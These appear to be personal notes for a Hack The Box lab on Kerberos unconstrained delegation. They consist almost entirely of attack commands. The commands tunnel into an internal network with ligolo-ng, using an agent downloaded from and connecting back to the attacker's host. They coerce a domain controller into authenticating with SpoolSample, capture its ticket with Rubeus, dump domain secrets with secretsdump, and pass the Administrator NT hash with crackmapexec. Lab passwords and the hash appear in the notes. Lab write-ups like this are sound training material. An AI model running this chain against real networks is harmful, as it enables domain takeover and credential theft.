# [Kerberos Delegation](Kerberos%20Delegation.md)

```sh
sharpview -t 180 Get-DomainComputer -Unconstrained
```

![](Screenshot%202026-11-16%20at%2012.49.24.png)

Setup ligolo proxy

```sh
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.4/ligolo-ng_proxy_0.7.4_linux_amd64.tar.gz
tar xzf ligolo-ng_proxy_0.7.4_linux_amd64.tar.gz

sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

![](Screenshot%202026-11-17%20at%2014.52.34.png)

Setup ligolo agent

```powershell
wget http://10.10.14.140:1234/agent.zip -o agent.exe
.\agent.exe -connect 10.10.14.140:11601 -ignore-cert
```

![](Screenshot%202026-11-17%20at%2015.01.08.png)

```sh
sudo ip route add 172.16.1.0/24 dev ligolo
```

![](Screenshot%202026-11-17%20at%2015.02.16.png)
![](Screenshot%202026-11-17%20at%2015.02.30.png)

```sh
impacket-psexec child/svc_sql:jkhnrjk123\!@172.16.1.12
```

![](Screenshot%202026-11-17%20at%2015.03.32.png)

```sh
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8888
```

![](Screenshot%202026-11-17%20at%2015.12.23.png)

```sh
python3 -m http.server 8888
```

![](Screenshot%202026-11-17%20at%2015.13.01.png)

```powershell
wget http://172.16.1.11:8888/Rubeus.exe -OutFile Rubeus.exe
```

![](Screenshot%202026-11-17%20at%2015.13.41.png)

Traffic flow: `SRV01 → WEB01:8888 → (through Ligolo tunnel) → Parrot:8888`

```sh
inline-execute-assembly /home/htb-ac-1951749/SpoolSample.exe 'dc01 srv01'
```

![](Screenshot%202026-11-17%20at%2015.16.27.png)

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

![](Screenshot%202026-11-17%20at%2015.21.14.png)

```powershell
nslookup dc01.child.htb.local
```

![](Lab%20Kerberos%20Delegation-20261117-152740.png)

```sh
cat > /home/htb-ac-1951749/dc01_final.b64 << 'EOF'
doIVqoER<SNIP>sPQUw=
EOF

base64 -d /home/htb-ac-1951749/dc01_final.b64 > /home/htb-ac-1951749/dc01_final.kirbi

impacket-ticketConverter dc01_final.kirbi dc01_final.ccache

sudo ntpdate -u 172.16.1.15

export KRB5CCNAME=/home/htb-ac-1951749/dc01_final.ccache
```

![](Screenshot%202026-11-17%20at%2015.32.54.png)
### Submit the Administrator's NT hash

```sh
impacket-secretsdump -k -no-pass \
  -dc-ip 172.16.1.15 \
  child.htb.local/DC01\$@dc01.child.htb.local
```

![](Screenshot%202026-11-16%20at%2014.40.12.png)
### Enter the numerical value of the machines that can be accessed via the Administrator's hash

```sh
crackmapexec smb 172.16.1.11 \
  -u administrator \
  -H e7d6a507876e2c8b7534143c1c6f28ba

crackmapexec smb 10.129.254.84 \
  -u administrator \
  -H e7d6a507876e2c8b7534143c1c6f28ba
```

![](Screenshot%202026-11-16%20at%2014.43.29.png)